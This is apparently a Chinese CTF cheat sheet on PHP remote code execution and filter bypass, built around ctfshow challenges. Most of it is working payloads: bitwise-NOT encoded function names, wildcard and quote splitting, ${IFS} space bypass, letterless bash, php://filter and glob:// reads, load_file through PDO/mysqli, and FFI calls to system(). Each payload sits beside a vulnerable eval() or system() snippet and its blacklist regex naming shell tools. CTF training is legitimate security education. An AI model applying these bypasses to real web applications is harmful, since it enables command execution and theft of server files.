php取反system(&#x27;ls&#x27;);-&gt;(~%8C%86%8C%8B%9A%92)(~%93%8C);system(&#x27;tac flag.php&#x27;);-&gt;(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F);

请注意：在Linux系统中，system()函数不支持以上操作！此外，当 $、+、-、^、~、|、% 这些字符被过滤后，以上方法将失效。举些例子（以下题目来自ctfshow）：&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;考点：敏感词汇过滤payload:    ?c=system(&#x27;ls&#x27;);    ?c=system(&#x27;tac fl*g.php&#x27;);
&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;考点：敏感词汇过滤payload:    ?c=echo `ls`;    ?c=echo `tac fl*g.*`;       // 通配符    ?c=echo `tac fl?g.???`;     // 通配符    ?c=echo `nl fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;  // 适用于*被过滤的情况，运行后无回显，需要手动查看源代码    拼接法：    ?c=$a=sys;$b=tem;$c=$a.$b;$c(&#x27;ls&#x27;);    ?c=$a=sys;$b=tem;$c=&quot;$&#123;a&#125;$&#123;b&#125;&quot;;$c(&#x27;tac fl*g.*&#x27;);
&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);考点：敏感词汇过滤、敏感字符过滤payload:    ?c=include$_GET[url]?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php&#125;
&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;考点：敏感词汇过滤、敏感字符过滤payload:    ?c=tac&lt;fl&#x27;&#x27;ag.php||    ?c=ta&#x27;&#x27;c&lt;fl&#x27;&#x27;ag.php||  // 适用于tac被过滤的情况
&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))&#123;        eval($c);    &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;考点：敏感字符过滤、全数字过滤payload:    ?c=eval(next(reset(get_defined_vars())));&amp;1=system(&quot;ls&quot;);    ?c=eval(next(reset(get_defined_vars())));&amp;1=system(&quot;tac%20flag.php&quot;);// get_defined_vars(void)：返回一个包含所有已定义变量列表的多维数组，可以替代任意变量。这些变量包括环境变量、服务器变量和用户定义的变量。 
&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;        system($c);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;考点：高级敏感词汇过滤、空格过滤解题思路：通配符绕过、空格绕过payload:    ?c=/bin/ca?$&#123;IFS&#125;????.???
&lt;?php// 你们在炫技吗？if(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;        system($c);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;考点：全字母过滤payload1:  // bash无字母命令执行    ?c=$&#x27;\164\141\143&#x27; $&#x27;\146\154\141\147\56\160\150\160&#x27;payload2:  // 访问/bin/base64 flag.php，编码flag.php    ?c=/???/????64 ????.???    执行后，页面回显base64编码后的flag.php；注意：这个不是通用的,因为base64不是每个机器都有payload3:  // 访问/usr/bin/bzip2 flag.php，压缩flag.php    ?c=/???/???/????2 ????.???    执行后，访问url/flag.php.bz2即可下载压缩后的flag.php
&lt;?php// 还能炫的动吗？//flag in 36.phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c))&#123;        system(&quot;cat &quot;.$c.&quot;.php&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;考点：全数字过滤、全字母过滤解题思路：过滤了%，取反、异或、或不可用，使用$(())构造数字payload:    $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))

突破禁用函数命令执行，突破禁用函数；攻击者需要想方设法绕过重重限制；
函数调用一般POST突破，直接在POST里面调用函数并传入即可；
查找路径：file=print_r(scandir(&quot;/&quot;));file=var_export(scandir(&quot;/&quot;));file=echo json_encode(glob(&#x27;../../../*&#x27;));读取目标文件：file=show_source(&#x27;flag.php&#x27;);file=highlight_file(&#x27;/flag.txt&#x27;);file=readgzfile(&#x27;/flag.txt&#x27;);file=require(&#x27;/flag.txt&#x27;);file=require_once(&#x27;/flag.txt&#x27;);file=include(&#x27;/flag.txt&#x27;);

拦截跳出如果不想执行后续代码，避免输出缓冲区被劫持过滤，可以在命令末尾处添加以下两种功能函数：

提前送出缓冲区；ob_flush();ob_end_flush();
提前终止程序；exit(0);die(0);

glob伪协议如果存在open_basedir配置的限制，常规的PHP访问函数被限制或禁用，使用glob协议绕过open_basedir的限制：
file=?&gt;&lt;?php $a = new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;    echo($f-&gt;__toString().&#x27;&#x27;);&#125;exit(0);?&gt;

连接数据库如果存在include_path限制，文件包含路径受限，无法直接使用include包含得到flag信息，使用以下方式连接MySQL数据库访问flag：

PDO连接；file=try&#123;    $dbh = new PDO(&#x27;mysql: host = localhost; dbname = ctftraining&#x27;, &#x27;root&#x27;, &#x27;root&#x27;);    foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag.txt&quot;)&#x27;) as $row)    &#123;        echo($row[0]).&quot;|&quot;;    &#125;    $dbh = null;&#125;catch (PDOException $e)&#123;    echo $e-&gt;getMessage();    exit(0);&#125;exit(0);
回环地址连接；file=$conn = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;, &quot;ctftraining&quot;);$sql = &quot;select load_file(&#x27;/flag.txt&#x27;) as a&quot;;$row = mysqli_query($conn, $sql);while($result = mysqli_fetch_array($row))&#123;    echo $result[&#x27;a&#x27;];&#125;exit(0);

FFI（仅限于PHP7.4及以上版本）PHP外部函数接口特性，用于实现高级语言之间的互相调用；使用FFI::cdef()函数定义我们需要调用的函数的原型：
FFI::cdef([string $cdef = &quot;&quot; [, string $lib = null]]): FFI
这里引入例题web77（本题未开源，故不放上源代码）：
file=$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);   // 创建一个system对象$a=&#x27;/readflag &gt; flag.txt&#x27;;    // 此步无回显$ffi-&gt;system($a);    // 通过$ffi去调用system函数访问url/flag.txt即可获取flag；

举些例子&lt;?phperror_reporting(0);ini_set(&#x27;display_errors&#x27;, 0);// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123;        $c= $_POST[&#x27;c&#x27;];        eval($c);        $s = ob_get_contents();  // 获取缓冲区的数据        ob_end_clean();        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);  // 清除缓冲区的内容并将缓冲区关闭，但不会输出内容&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;你要上天吗？payload1:    c=echo json_encode(glob(&#x27;../../../*&#x27;));exit(0);    c=include(&#x27;/flag.txt&#x27;);ob_flush();payload2:    c=print_r(scandir(&quot;/&quot;));exit(0);    c=include(&#x27;/flag.txt&#x27;);exit(0);

